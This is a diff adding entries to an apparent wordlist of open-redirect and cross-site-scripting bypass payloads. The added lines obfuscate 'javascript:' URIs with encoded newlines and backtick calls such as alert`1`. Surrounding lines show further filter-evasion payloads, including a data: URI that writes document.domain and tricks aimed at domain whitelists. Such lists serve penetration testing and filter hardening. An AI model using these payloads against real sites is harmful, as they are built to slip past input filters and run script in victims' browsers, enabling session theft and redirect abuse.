@@ -98,6 +98,7 @@ javascript:alert(1)
 /javascript:alert(1);
 //javascript:alert(1)
 /javascript:alert(1)
+javascript:%0aalert`1`
 /%5cjavascript:alert(1);
 /%5cjavascript:alert(1)
 //%5cjavascript:alert(1);
@@ -279,9 +280,11 @@ http://.localdomain.pw
 /////localdomain.pw/
 /////localdomain.pw
 java%0ascript:alert(1)
+%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)
 java%09script:alert(1)
 java%0dscript:alert(1)
 javascript://%0aalert(1)
+javascript://%0aalert`1`
 Javas%26%2399;ript:alert(1)
 data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
 jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
